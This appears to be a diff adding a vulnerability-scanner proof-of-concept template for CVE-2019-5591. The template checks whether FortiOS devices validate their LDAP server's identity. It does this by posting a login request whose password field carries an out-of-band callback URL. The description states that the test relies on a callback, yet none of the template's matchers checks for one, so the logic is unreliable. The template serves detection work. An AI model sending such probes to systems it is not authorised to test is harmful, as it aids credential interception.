@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "检测 FortiOS 设备 LDAP 配置是否启用了 server-identity-check。通过向登录接口发送包含 OAST 载荷的请求，若目标向攻击者控制的 LDAP 服务器发起认证请求（产生 OAST 回调），则表明存在不安全配置。攻击者需与目标设备处于同一子网，可冒充 LDAP 服务器截获敏感认证信息。"
+id = "POC-AVE-2019-1309"
+name = "FortiOS LDAP 不安全配置检测 PoC"
+severity = "medium"
+tags = ["ave-2019-1309"]
+vuln_id = [
+    "CVE-2019-5591",
+    "AVE-2019-1309",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/login"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    'name="username"',
+    'name="secretkey"',
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/logincheck"
+protocol = "http"
+
+[poc.requests.body]
+content = "ajax=1&username={{rand_text_alpha(10)}}&secretkey={{interactsh-url}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/plain;charset=UTF-8"
+
+[[poc.requests.matchers]]
+expect = true
+negative = true
+part = "body"
+type = "word"
+words = ["ajax=1&username="]
